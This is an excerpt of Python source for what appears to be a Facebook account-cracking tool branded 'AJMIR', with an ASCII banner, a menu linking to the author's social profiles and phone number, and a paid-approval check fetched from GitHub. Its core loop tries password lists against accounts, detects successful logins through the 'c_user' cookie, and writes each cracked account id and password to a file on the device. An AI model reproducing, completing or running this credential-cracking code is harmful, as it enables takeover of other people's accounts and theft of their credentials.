...
logo=("""  
 \033[34;1m      ___            __  .___  ___.  __  .______        \033[34;1m   /   \          |  | |   \/   | |  | |   _  \     
 \033[34;1m   /  ^  \         |  | |  \  /  | |  | |  |_)  |    
 \033[34;1m  /  /_\  \  .--.  |  | |  |\/|  | |  | |      /     
 \033[34;1m /  _____  \ |  `--'  | |  |  |  | |  | |  |\  \----.
 \033[34;1m/__/     \__\ \______/  |__|  |__| |__| | _| `._____|
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+880181322564%78');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/Ajmir.Hossain.008');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/Ajmirhossain000');time.sleep(1)
		admin()
	if bal =='0':
		Main()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/AJMIR-008-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Ajmirhosen000/Random1/blob/main/approval.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
